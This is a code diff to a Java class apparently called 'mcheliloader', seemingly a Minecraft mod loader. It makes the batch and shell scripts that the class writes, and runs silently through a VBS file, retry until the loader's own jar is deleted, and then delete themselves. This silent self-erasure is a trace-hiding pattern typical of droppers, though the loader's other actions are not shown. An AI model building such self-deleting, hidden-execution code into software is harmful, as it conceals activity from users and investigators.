@@ -217,9 +217,13 @@ public class mcheliloader {
             Path vbsFile = Paths.get(minecraftDir.getPath(), "run_silent.vbs");
 
             try (BufferedWriter writer = Files.newBufferedWriter(batchFile)) {
-                writer.write("ping 127.0.0.1 -n 2 > nul\n"); // Delay to ensure the Java process has terminated
-                writer.write("del \"" + jarFilePath + "\"\n");
-                writer.write("del \"%~f0\""); // Deletes batch file
+                writer.write("ping 127.0.0.1 -n 8 > nul\n"); 
+                writer.write(":deleteLoop\n"); 
+                writer.write("if exist \"" + jarFilePath + "\" (\n");
+                writer.write("    del \"" + jarFilePath + "\"\n"); 
+                writer.write("    if exist \"" + jarFilePath + "\" goto deleteLoop\n"); // If the file still exists loop
+                writer.write(")\n");
+                writer.write("del \"%~f0\""); 
             }
 
             try (BufferedWriter writer = Files.newBufferedWriter(vbsFile)) {
@@ -246,9 +250,12 @@ public class mcheliloader {
             Path shellScript = Paths.get(minecraftDir.getPath(), "delete_self.sh");
             try (BufferedWriter writer = Files.newBufferedWriter(shellScript)) {
                 writer.write("#!/bin/sh\n");
-                writer.write("sleep 2\n"); // Delay to ensure the Java process has terminated
-                writer.write("rm -f \"" + jarFilePath + "\"\n");
-                writer.write("rm -- \"$0\""); // Deletes shell script
+                writer.write("sleep 8\n"); 
+                writer.write("while [ -e \"" + jarFilePath + "\" ]; do\n"); 
+                writer.write("    rm -f \"" + jarFilePath + "\"\n"); 
+                writer.write("    sleep 1\n");
+                writer.write("done\n");
+                writer.write("rm -- \"$0\""); // Deletes S Script
             }
 
             Runtime.getRuntime().exec("/bin/sh " + shellScript);
